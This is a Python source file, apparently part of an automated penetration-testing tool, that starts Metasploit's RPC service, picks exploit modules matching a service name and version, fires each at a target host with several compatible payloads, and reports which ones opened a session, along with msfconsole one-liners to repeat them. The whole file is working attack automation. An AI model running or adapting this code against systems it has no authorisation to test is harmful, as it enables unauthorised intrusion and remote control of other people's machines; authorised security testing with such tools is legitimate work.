import time
from pymetasploit3.msfrpc import MsfRpcClient
import subprocess
import pty
import json
import re
import socket

from config import MSF_INDEX_FILE


class ExploitManager:
    def __init__(self, host='127.0.0.1', password='msf', port=55552):
        master, slave = pty.openpty()
        self.process = subprocess.Popen(
            ['msfconsole', '-qx', f'load msgrpc ServerHost={host} Pass={password}'],
            stdin=slave, stdout=slave, stderr=slave, universal_newlines=True
        )
        if self.wait_msf_ready(host, port):
            pass
        else:
            raise TimeoutError("The msf failed to start!")
        self.client = MsfRpcClient(password, port=port)
        with open(MSF_INDEX_FILE, 'r') as f:
            self.msf_index = json.load(f)
        self.max_try_payloads = 3

    def wait_msf_ready(self, host, port, timeout=30):
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.create_connection((host, port), timeout=2):
                    print(f"MSF started in {time.time()-start_time} seconds")
                    return True
            except (socket.timeout, ConnectionRefusedError):
                time.sleep(1)  # Wait for a second before trying again
        print("Timed out waiting for service")
        return False

    def find_exploit_modules(self, service, version):
        print(f"searching for exploits of {service} with version {version}")
        service_pattern = re.compile(re.escape(service), re.IGNORECASE)
        version_pattern = re.compile(re.escape(str(version)), re.IGNORECASE)

        matching_modules = set()
        for module in self.msf_index:
            if service_pattern.search(module['name']) or service_pattern.search(module['description']):
                if version_pattern.search(module['name']) or version_pattern.search(module['description']):
                    matching_modules.add(module['path'])

        return list(matching_modules)

    def apply_exploits(self, exploits, target):
        success_exploits = []
        for exploit_name in exploits:
            print(exploit_name)
            exploit = self.client.modules.use('exploit', exploit_name)
            print(exploit.options)
            if 'RHOSTS' in exploit.options:
                exploit['RHOSTS'] = target['host']
            elif 'RHOST' in exploit.options:
                exploit['RHOST'] = target['host']
            else:
                # for simplicity, try only exploits with defined host/port
                continue

            if 'RPORT' in exploit.options:
                exploit['RPORT'] = target['port']

            for payload in self.client.call('module.compatible_payloads', [exploit_name])['payloads'][:self.max_try_payloads]:
                print("Trying payload ", payload)
                exploit.execute(payload=payload)
                if self._wait_for_success():
                    success_exploits.append(exploit_name)
                    break
        return success_exploits

    def _wait_for_success(self, retries=3, delay=5):
        for _ in range(retries):
            time.sleep(delay)
            if self.client.sessions.list:
                return True
        return False

    def exploit_target(self, target, product, version):
        exploits = self.find_exploit_modules(product, version)
        successful_exploits = self.apply_exploits(exploits, target)
        return self._prepare_responses(target, successful_exploits)

    @staticmethod
    def _prepare_responses(target, successful_exploits):
        responses = []
        for exploit in successful_exploits:
            msf_one_liner = (
                f'msfconsole -q -x "use {exploit}; set RHOSTS {target["host"]}; '
                f'set RPORT {target["port"]}; run"'
            )
            response = f'Exploit {exploit} succeeded against {target["host"]}:{target["port"]}. MSF one-liner: {msf_one_liner}'
            responses.append(response)
        return responses
